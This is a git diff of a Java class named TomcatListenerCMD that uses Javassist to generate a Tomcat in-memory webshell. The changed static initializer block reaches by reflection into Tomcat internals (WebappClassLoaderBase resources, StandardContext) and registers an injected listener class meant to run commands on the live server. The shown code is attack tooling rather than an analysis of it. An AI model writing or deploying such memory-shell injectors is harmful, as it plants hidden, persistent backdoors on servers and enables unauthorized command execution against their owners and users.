@@ -71,15 +71,11 @@ public class TomcatListenerCMD {
 
         // 创建静态方法块
         ctClass.makeClassInitializer().insertBefore("try {\n" +
-                "            org.apache.catalina.core.ApplicationContextFacade facade =\n" +
-                "                    (org.apache.catalina.core.ApplicationContextFacade) ((org.apache.catalina.loader.WebappClassLoaderBase)Thread.currentThread()\n" +
-                "                            .getContextClassLoader()).getResources().getContext().getServletContext();\n" +
-                "            java.lang.reflect.Field contextField = org.apache.catalina.core.ApplicationContextFacade.class.getDeclaredField(\"context\");\n" +
-                "            contextField.setAccessible(true);\n" +
-                "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(facade);\n" +
-                "            java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField(\"context\");\n" +
-                "            standardContextField.setAccessible(true);\n" +
-                "            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) standardContextField.get(applicationContext);\n" +
+                "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = ((org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader());\n" +
+                "            java.lang.reflect.Field resources = java.lang.Class.forName(\"org.apache.catalina.loader.WebappClassLoaderBase\").getDeclaredField(\"resources\");\n" +
+                "            resources.setAccessible(true);\n" +
+                "            org.apache.catalina.WebResourceRoot webResourceRoot = (org.apache.catalina.WebResourceRoot) resources.get(webappClassLoaderBase);\n" +
+                "            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webResourceRoot.getContext();"+
                 "            " + className + " " + className.toLowerCase() + " = new " + className + "();" +
                 "            String listenerShellClassName = " + className.toLowerCase() + ".getClass().getName();" +
                 "            standardContext.addApplicationListener(listenerShellClassName);" +
